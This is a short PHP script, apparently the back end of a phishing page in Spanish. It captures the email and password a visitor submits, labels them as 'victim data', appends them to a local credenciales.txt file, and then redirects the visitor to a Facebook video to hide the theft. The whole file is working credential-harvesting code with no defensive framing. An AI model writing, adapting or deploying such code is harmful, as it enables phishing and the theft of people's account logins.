<?PHP
$email = $_POST["email"];
$contrasena = $_POST["pass"];
$texto = "Datos de la victima.\n Correo: $email y contrasena:  $contrasena";
echo "
<script language='JavaScript'>
location.href = \"https://www.facebook.com/story.php?story_fbid=433098780372470&id=432055777143437&refsrc=https%3A%2F%2Fm.facebook.com%2FTutorialesAndroidess%2Fvideos%2F433098780372470%2F&_rdr\";
</script>";

$file=fopen("credenciales.txt","a+") or exit("Unable to open file!");

   fwrite($file, $texto);


fclose($file);

?>